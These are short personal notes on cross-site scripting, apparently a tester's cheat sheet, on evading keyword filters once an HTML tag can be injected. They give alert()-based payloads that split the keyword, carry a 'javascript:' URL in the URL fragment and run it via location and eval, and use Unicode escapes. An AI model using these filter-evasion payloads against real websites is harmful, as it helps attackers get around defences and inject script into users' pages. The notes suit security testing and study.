you already opened an HTML tag, but can't execute JS

if you got here, you could certainly have XSS

# if it's sensitive to words --> use alternative payloads:

- break the payload: `(aler + t(origin))`
- put the payload to the fragment
  `url#javascript:alert(1)` should be added to the url; then somehow execute the rest
  `location=location.hash.split('#')` --> `location.hash.split('#')[1]` ==
  `javascript:alert(1)`
  then if you `eval(location=location.hash.split('#'))` XSS!
- Unicode variations
  - `\u{0061}`
  - `\u{000000061}`
